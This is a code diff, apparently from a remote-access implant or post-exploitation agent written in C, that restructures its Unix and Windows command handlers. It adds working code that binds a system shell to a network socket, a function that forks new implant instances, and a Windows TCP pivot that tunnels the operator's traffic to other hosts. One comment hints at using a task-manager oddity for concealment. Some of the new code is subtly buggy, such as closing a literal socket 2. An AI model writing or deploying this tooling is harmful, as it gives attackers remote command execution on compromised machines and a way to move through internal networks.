@@ -400,16 +400,89 @@ void do_dns_resolve(Parser *p)
     }
 }
 
+// The following functions are so different between Windows and Linux that it was best to
+// just write them two times rather than having an ifdef inside each of them.
+#ifndef _WIN32
+
+// Unix versions. So elegant.
+// I put them first so you don't judge me too harshly when you read the Windows versions.
+
+void do_system_fork(Parser *p)
+{
+    // Generate a new UUID for the new instance.
+    unsigned char uuid[16];
+    uuid4(uuid);
+
+    // Send the new UUID back to the caller.
+    parser_begin_response(p, CMD_STATUS_OK, sizeof(uuid));
+    send_block(p->fd, uuid, sizeof(uuid));
+
+    // Fork the new instance.
+    if (fork() == 0) {
+
+        // We are in the child instance now.
+        // Set the new UUID into the Parser object.
+        memcpy(p->uuid, uuid, sizeof(uuid));
+
+        // Close the socket object and reconnect.
+        // Do not shutdown! The parent process still uses this connection.
+        close(p->fd);
+        p->fd = -1;
+        parser_close(p);
+        parser_connect(p);
+    }
+}
+
+void do_system_shell(Parser *p)
+{
+    char *shell = NULL;
+    char *argv[2];
+
+    // Find out what our shell is.
+    shell = getenv("SHELL");
+
+    // If for some odd reason we don't have a SHELL variable, hardcode a default.
+    if (shell == NULL) {
+        shell = "/bin/sh";
+    }
+
+    // Test if the file actually exists and we have execution permission.
+    if (access(shell, X_OK) == -1) {
+        LOG("Cannot find a shell for the current user\n");
+        parser_error(p, "no shell available");
+        return;
+    }
+
+    // Send the OK status before invoking the shell, since we'll be reusing the channel.
+    parser_ok(p);
+
+    // Fork the process.
+    if (fork() == 0) {
+
+        // The new process will invoke the shell and pipe it though the socket.
+        // The socket timeout values will be disabled.
+        setsockopt(p->fd, SOL_SOCKET, SO_RCVTIMEO, NULL, 0);
+        setsockopt(p->fd, SOL_SOCKET, SO_SNDTIMEO, NULL, 0);
+        dup2(p->fd, 0);
+        dup2(p->fd, 1);
+        dup2(p->fd, 2);
+        argv[0] = shell;
+        argv[1] = NULL;
+        execvp(shell, argv);
+
+    } else {
+
+        // The parent process will "forget" the connection.
+        close(p->fd);
+        p->fd = -1;
+        parser_close(p);
+
+    }
+    LOG("Launched remote shell\n");
+}
+
 void do_tcp_pivot(Parser *p)
 {
-#ifdef _WIN32
-
-    // Disable this feature on Windows until I figure out how to implement it nicely.
-    LOG("User requested a tunnel, but this feature is not yet implemented on Windows\n");
-    parser_error(p, "not implemented on this operating system");
-
-#else
-
     int sock = -1;
     CMD_TCP_PIVOT_ARGS *pivot = (CMD_TCP_PIVOT_ARGS *) p->buffer;
     struct sockaddr_in sa;
@@ -485,15 +558,14 @@ void do_tcp_pivot(Parser *p)
         parser_close(p);
 
     }
-
-#endif
 }
+
+#else
+
+// Windows versions. Enough spaghetti to feed half of Italy.
 
 void do_system_fork(Parser *p)
 {
-
-#ifdef _WIN32
-
     // While there is a curious fork() hack on Windows, I can't seem to get it working well.
     // The processes are forking alright but they can't seem to use sockets afterwards.
     // There are also some oddities in task manager... this could be useful later! >:)
@@ -531,95 +603,12 @@ void do_system_fork(Parser *p)
     } else {
         parser_error(p, "internal error");
     }
-
-#else
-
-    // Generate a new UUID for the new instance.
-    unsigned char uuid[16];
-    uuid4(uuid);
-
-    // Send the new UUID back to the caller.
-    parser_begin_response(p, CMD_STATUS_OK, sizeof(uuid));
-    send_block(p->fd, uuid, sizeof(uuid));
-
-    // Fork the new instance.
-    if (fork() == 0) {
-
-        // We are in the child instance now.
-        // Set the new UUID into the Parser object.
-        memcpy(p->uuid, uuid, sizeof(uuid));
-
-        // Close the socket object and reconnect.
-        // Do not shutdown! The parent process still uses this connection.
-        close(p->fd);
-        p->fd = -1;
-        parser_close(p);
-        parser_connect(p);
-    }
-
-#endif
 }
-
-#ifndef _WIN32
-
-// Unix version. So elegant.
-
-void do_system_shell(Parser *p)
-{
-    char *shell = NULL;
-    char *argv[2];
-
-    // Find out what our shell is.
-    shell = getenv("SHELL");
-
-    // If for some odd reason we don't have a SHELL variable, hardcode a default.
-    if (shell == NULL) {
-        shell = "/bin/sh";
-    }
-
-    // Test if the file actually exists and we have execution permission.
-    if (access(shell, X_OK) == -1) {
-        LOG("Cannot find a shell for the current user\n");
-        parser_error(p, "no shell available");
-        return;
-    }
-
-    // Send the OK status before invoking the shell, since we'll be reusing the channel.
-    parser_ok(p);
-
-    // Fork the process.
-    if (fork() == 0) {
-
-        // The new process will invoke the shell and pipe it though the socket.
-        // The socket timeout values will be disabled.
-        setsockopt(p->fd, SOL_SOCKET, SO_RCVTIMEO, NULL, 0);
-        setsockopt(p->fd, SOL_SOCKET, SO_SNDTIMEO, NULL, 0);
-        dup2(p->fd, 0);
-        dup2(p->fd, 1);
-        dup2(p->fd, 2);
-        argv[0] = shell;
-        argv[1] = NULL;
-        execvp(shell, argv);
-
-    } else {
-
-        // The parent process will "forget" the connection.
-        close(p->fd);
-        p->fd = -1;
-        parser_close(p);
-
-    }
-    LOG("Launched remote shell\n");
-}
-
-#else
-
-// Windows version. Enough spaghetti to feed half of Italy.
 
 typedef struct{
     int sock;
     HANDLE pipe;
-} _stub_thread_params;
+} _stub_shell_thread_params;
 
 DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam);
 DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam);
@@ -627,8 +616,8 @@ DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam);
 void do_system_shell(Parser *p)
 {
     char shell[MAX_PATH];
-    _stub_thread_params *thread_args_1 = NULL;
-    _stub_thread_params *thread_args_2 = NULL;
+    _stub_shell_thread_params *thread_args_1 = NULL;
+    _stub_shell_thread_params *thread_args_2 = NULL;
     DWORD success = 0;
     DWORD dwAttrib = INVALID_FILE_ATTRIBUTES;
     HANDLE readStdIn = INVALID_HANDLE_VALUE;
@@ -688,8 +677,8 @@ void do_system_shell(Parser *p)
 
     // The background threads to pipe the shell will need to know the handles.
     // For memory safety we need to use the heap for this.
-    thread_args_1 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * 2);
-    thread_args_2 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * 2);
+    thread_args_1 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(_stub_shell_thread_params));
+    thread_args_2 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(_stub_shell_thread_params));
     if (thread_args_1 == NULL || thread_args_2 == NULL) {
         HeapFree(hHeap, 0, thread_args_1);
         HeapFree(hHeap, 0, thread_args_2);
@@ -786,15 +775,15 @@ void do_system_shell(Parser *p)
     p->fd = -1;
     parser_close(p);
 
+    // Log the event.
     LOG("Launched remote shell: %s\n", shell);
 }
 
 // This function runs in a background thread.
 DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam)
 {
-
     // Fetch the arguments and free the memory.
-    _stub_thread_params *thread_args = lpParam;
+    _stub_shell_thread_params *thread_args = lpParam;
     HANDLE pipe = thread_args->pipe;
     int sock = thread_args->sock;
     HeapFree(GetProcessHeap(), 0, lpParam);
@@ -830,9 +819,8 @@ DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam)
 // This function runs in a background thread.
 DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam)
 {
-
     // Fetch the arguments and free the memory.
-    _stub_thread_params *thread_args = lpParam;
+    _stub_shell_thread_params *thread_args = lpParam;
     HANDLE pipe = thread_args->pipe;
     int sock = thread_args->sock;
     HeapFree(GetProcessHeap(), 0, lpParam);
@@ -859,6 +847,138 @@ DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam)
     shutdown(sock, 2);
     closesocket(sock);
     CloseHandle(pipe);
+    ExitThread(0);
+}
+
+typedef struct{
+    int src;
+    int dst;
+} _stub_pivot_thread_params;
+
+DWORD WINAPI _stub_copy_socket_stream(LPVOID lpParam);
+
+void do_tcp_pivot(Parser *p)
+{
+    int sock = -1;
+    CMD_TCP_PIVOT_ARGS *pivot = (CMD_TCP_PIVOT_ARGS *) p->buffer;
+    struct sockaddr_in sa;
+    _stub_pivot_thread_params *thread_args_1 = NULL;
+    _stub_pivot_thread_params *thread_args_2 = NULL;
+    DWORD success = 0;
+    HANDLE hHeap = GetProcessHeap();
+    HANDLE hThread_1 = INVALID_HANDLE_VALUE;
+    HANDLE hThread_2 = INVALID_HANDLE_VALUE;
+
+    // Read the TCP pivot options structure.
+    if (p->header.cmd_len != sizeof(CMD_TCP_PIVOT_ARGS) || parser_read_first_arg(p, (char *) &p->buffer, sizeof(CMD_TCP_PIVOT_ARGS)) < 0) {
+        LOG("Malformed TCP pivot request\n");
+        parser_error(p, "malformed request");
+        parser_close(p);
+        return;
+    }
+
+    // Connect to the target IP and port.
+    sock = create_socket(AF_INET);
+    memset((void *) &sa, 0, sizeof(sa));
+    sa.sin_family = AF_INET;
+    if (pivot->from_port != 0) {
+        sa.sin_port = pivot->from_port;
+        bind(sock, (const struct sockaddr *) &sa, sizeof(sa));
+    }
+    sa.sin_port = pivot->port;
+    memcpy((void *) &sa.sin_addr, (void *) &pivot->ip, sizeof(sa.sin_addr));
+    if (pivot->from_port != 0) {
+        LOG("Pivoting to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
+    } else {
+        LOG("Pivoting to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
+    }
+    if (connect_socket(sock, (const struct sockaddr *) &sa, sizeof(sa)) < 0) {
+        if (pivot->from_port != 0) {
+            LOG("Can not connect to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
+        } else {
+            LOG("Can not connect to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
+        }
+        parser_error(p, "connection refused");
+        return;
+    }
+
+    // The background threads will need to know the handles.
+    // For memory safety we need to use the heap for this.
+    thread_args_1 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * 2);
+    thread_args_2 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * 2);
+    if (thread_args_1 == NULL || thread_args_2 == NULL) {
+        HeapFree(hHeap, 0, thread_args_1);
+        HeapFree(hHeap, 0, thread_args_2);
+        shutdown(sock, 2);
+        closesocket(2);
+        parser_error(p, "memory error");
+        return;
+    }
+
+    // Create the background threads that will do the pivoting.
+    thread_args_1->src = sock;
+    thread_args_1->dst = p->fd;
+    thread_args_2->src = p->fd;
+    thread_args_2->dst = sock;
+    hThread_1 = CreateThread(NULL, 0, &_stub_copy_socket_stream, thread_args_1, CREATE_SUSPENDED, NULL);
+    hThread_2 = CreateThread(NULL, 0, &_stub_copy_socket_stream, thread_args_2, CREATE_SUSPENDED, NULL);
+    if (hThread_1 == NULL || hThread_2 == NULL) {
+        TerminateThread(hThread_1, 0);
+        TerminateThread(hThread_2, 0);
+        CloseHandle(hThread_1);
+        CloseHandle(hThread_2);
+        HeapFree(hHeap, 0, thread_args_1);
+        HeapFree(hHeap, 0, thread_args_2);
+        shutdown(sock, 2);
+        closesocket(2);
+        parser_error(p, "error creating threads");
+        return;
+    }
+
+    // Everything seems to be in order at this point.
+    // Send the OK status before launching the tunnel, since we'll be reusing the channel.
+    parser_ok(p);
+
+    // Resume execution in all the threads.
+    // We don't check for errors here because if there is one, there's nothing to do.
+    ResumeThread(hThread_1);
+    ResumeThread(hThread_2);
+
+    // Close the thread handles.
+    // The heap allocated memory is freed by the threads.
+    // The socket is closed when the pivot connection ends.
+    CloseHandle(hThread_1);
+    CloseHandle(hThread_2);
+
+    // Our protocol parser will "forget" the socket, forcing a reconnect.
+    // We do not actually close the socket since it's still in use.
+    p->fd = -1;
+    parser_close(p);
+
+    // Log the event.
+    if (pivot->from_port != 0) {
+        LOG("Launched TCP tunnel to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), pivot->port, pivot->from_port);
+    } else {
+        LOG("Launched TCP tunnel to %s:%d\n", inet_ntoa(sa.sin_addr), pivot->port);
+    }
+}
+
+DWORD WINAPI _stub_copy_socket_stream(LPVOID lpParam)
+{
+    // Fetch the arguments and free the memory.
+    _stub_pivot_thread_params *thread_args = lpParam;
+    int src = thread_args->src;
+    int dst = thread_args->dst;
+    HeapFree(GetProcessHeap(), 0, lpParam);
+
+    // Since they're both sockets we can use our handy helper function here. :)
+    copy_socket_stream(src, dst, -1);
+
+    // Close all the sockets and exit.
+    shutdown(src, 2);
+    shutdown(dst, 2);
+    closesocket(src);
+    closesocket(dst);
     ExitThread(0);
 }
 
